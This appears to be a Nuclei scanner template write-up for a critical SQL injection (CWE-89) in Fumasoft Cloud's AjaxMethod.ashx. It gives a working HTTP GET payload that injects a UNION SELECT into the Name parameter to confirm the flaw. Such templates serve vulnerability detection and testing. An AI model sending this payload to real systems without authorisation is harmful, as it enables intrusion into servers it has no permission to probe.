# Nuclei Template: Fumasoft Cloud - SQL Injection
**Template ID:** fumasoft-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`fumasoft-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the AjaxMethod.ashx file of Fumasoft Cloud. Attackers can obtain server permissions through the vulnerability

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{num}}')),3,32)--
```

